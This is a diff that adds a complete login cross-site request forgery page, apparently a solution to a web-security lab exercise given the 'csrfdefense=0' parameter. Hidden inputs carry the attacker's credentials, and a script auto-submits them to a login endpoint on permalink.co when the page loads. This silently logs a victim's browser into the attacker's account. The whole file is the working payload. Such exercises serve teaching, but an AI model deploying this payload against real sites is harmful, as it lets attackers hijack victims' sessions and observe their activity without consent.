@@ -1,0 +1,14 @@
+<html>
+  <body>
+
+    <form action="http://permalink.co:8080/login?csrfdefense=0&xssdefense=5" method="post" id ="login_info">
+    <input type="hidden" name="username" value="attacker"><br>
+    <input type="hidden" name="password" value="l33th4x"><br>
+    </form>
+
+    <script>
+    document.getElementById("login_info").submit();
+    </script>
+
+</body>
+</html>
